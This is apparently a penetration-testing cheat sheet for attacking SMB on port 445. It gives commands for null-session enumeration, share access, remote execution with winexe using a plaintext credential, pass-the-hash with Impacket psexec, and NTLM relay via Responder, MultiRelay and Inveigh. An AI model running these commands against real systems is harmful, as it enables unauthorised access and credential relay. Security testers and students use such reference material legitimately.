# 445 - SMB

## Check for null sessions

```
crackmapexec smb 192.168.120.0/24 10.0.0.0/23 -u '' -p ''
```

```
enum4linux <ip>
```

WinscanX - windows tool: [https://packetstormsecurity.com/files/84199/WinScanX-Password-Utility.html](https://packetstormsecurity.com/files/84199/WinScanX-Password-Utility.html)

## Connecting to SMB Shares

### List SMB shares

```
smbclient -L [IP]
```

### Connect to smb share

```
smbclient \\\\[ip]\\[share name]
```

`rpcclient -U "" -N [ip]`

`enum4linux -a <ip>`

```
/usr/bin/winexe -U mad01/user123%abcABC1234 //172.18.2.50 ipconfig
```

### Using psexec from Impacket

```
/usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:a40cad43aedd6bdddddddddf45 localadmin@192.168.93.19SMB Relay
```

### MultiRelay.py

For SMB Relay to be possible, you must turn off SMB and HTTP within the responder config file (you can change it back when you have finished)

Set responder.conf to:

![](<../../.gitbook/assets/image (5) (1).png>)

Then run responder:

```
sudo python3.9 /usr/share/responder/Responder.py -I eth0 -w -f -v
```

Then run the following in another terminal session

```
sudo python3.9 /usr/share/responder/tools/MultiRelay.py -t <target_IP> -u ALL
```

### Inveigh Relay

Session attack requires SMB tools from Invoke-TheHash

{% embed url="https://github.com/Kevin-Robertson/Invoke-TheHash" %}

```
Invoke-InveighRelay -ConsoleOutput Y -Target 10.0.2.110 -Command "...."
```

## Create an SMB Share

```
sudo impacket-smbserver share . -smb2support
```

## Scan for common vulns

`nmap --script smb-vuln* -p 139,445`
